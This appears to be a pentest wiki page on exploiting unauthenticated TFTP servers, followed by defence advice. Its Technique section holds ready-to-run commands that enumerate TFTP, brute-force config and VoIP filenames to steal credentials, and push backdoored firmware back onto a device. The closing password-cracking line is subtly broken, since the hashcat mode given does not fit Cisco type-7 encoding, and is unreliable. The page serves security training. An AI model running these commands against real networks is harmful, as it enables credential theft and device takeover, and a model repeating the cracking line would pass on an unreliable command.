---
title: TFTP Config and Firmware Exposure
slug: tftp-attacks
---

> **TL;DR:** TFTP on UDP 69 has no authentication and no directory listing, but predictable filenames (`router.cfg`, `voip/0004f2-abc.cfg`, `backup.bin`) yield router configs, VoIP credentials, and firmware that you can re-upload backdoored.

## What it is
Trivial File Transfer Protocol is a stripped-down UDP-only file transfer used for PXE boot, switch/router configuration backup, and VoIP phone provisioning. There is no authentication, no encryption, and no directory listing. Security relied entirely on obscure filenames and network segmentation — both of which fail in practice because vendors document the filename conventions and the management VLAN often bridges to user VLANs.

## Preconditions / where it applies
- UDP/69 (request port), data on ephemeral UDP ports
- Cisco IOS, Aruba, HP ProCurve, 3CX, Yealink, Polycom, Grandstream VoIP phones all use TFTP for config push
- Often present on the same VLAN as user endpoints because phones DHCP-discover the TFTP server (option 66/150)
- ISP CPE management interfaces sometimes leave it exposed to the WAN

## Technique
```bash
# Discover
nmap -sU -p 69 --script tftp-enum 10.0.0.70

# Guess common files (tftp-enum has a wordlist, or use your own)
for f in running-config startup-config router.cfg switch.cfg \
         cisco-config.txt ipphone-default.cfg SEPDEFAULT.cnf.xml \
         y000000000028.cfg 00085D-phone.cfg backup.bin firmware.img; do
  atftp --get --remote-file "$f" --local-file "/tmp/$f" 10.0.0.70 2>/dev/null \
    && echo "FOUND: $f"
done

# MAC-addressed VoIP configs — sweep the OUI range
for mac in 0004f2aabb01 0004f2aabb02 0004f2aabb03; do
  curl -s tftp://10.0.0.70/$mac.cfg -o $mac.cfg
done

# Push a malicious firmware / config back
atftp --put --local-file backdoored.bin --remote-file firmware.img 10.0.0.70

# Crack Cisco type-7 passwords from a recovered config
echo '07082E5C4F1A0A1218' | hashcat -m 999 -a 3
```

## Detection and defence
- Bind tftpd to the management VLAN only, with iptables/ufw on the server
- Use SFTP or HTTPS provisioning instead — Cisco supports `ip http secure-server` config pull
- Sign firmware images so a swapped TFTP payload fails verification at boot
- Detect: NetFlow showing UDP/69 from user-VLAN sources, or new MAC-prefixed file fetches from outside the phone subnet
- Patch / replace: many SOHO routers still ship TFTP servers with directory traversal (e.g. CVE-2019-18643 on D-Link DAP-1320)

## References
- [RFC 1350](https://www.rfc-editor.org/rfc/rfc1350) — the TFTP protocol, security section explicitly says "none"
- [Cisco Unified IP Phone provisioning guide](https://www.cisco.com/) — documents predictable filename scheme

See also: [[exposed-services]], [[port-scanning]], [[host-discovery]].
